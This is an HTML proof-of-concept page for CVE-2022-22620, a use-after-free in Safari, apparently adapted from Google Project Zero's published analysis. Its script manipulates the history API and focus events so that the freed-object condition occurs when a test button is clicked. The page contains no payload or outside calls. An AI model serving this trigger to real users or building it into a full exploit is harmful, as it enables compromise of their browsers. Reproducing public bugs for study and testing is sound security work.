<!DOCTYPE html>
<html>
 
<script>

function b(){
    Array.prototype.slice([]);  //needs "b arrayProtoFuncSlice"
}
function test_poc_safari()
    {
     //for debugging
      b();
     //for debugging
      input = document.body.appendChild(document.createElement("input"));


      a = document.body.appendChild(document.createElement("a"));

      a.id = "foo";


      history.pushState("state1", "", location + "#foo");

      history.pushState("state2", "");


      setTimeout(() => {

             input.focus();

             input.onblur = () => history.replaceState("state3", "");

              setTimeout(() => history.back(), 1000);

      }, 1000);



        }
     </script>
    <head>
     </head>
     <body>
        <h1>CVE-2022-22620: Use-after-free in Safari</h1>
        
        
        <h1>Based on Google Project Zero <a href=https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-22620.html> POC</a></h1>
        <center><button onclick="test_poc_safari();"> Test CVE-2022-22620 </button></center>
     </body>

    
   </html>
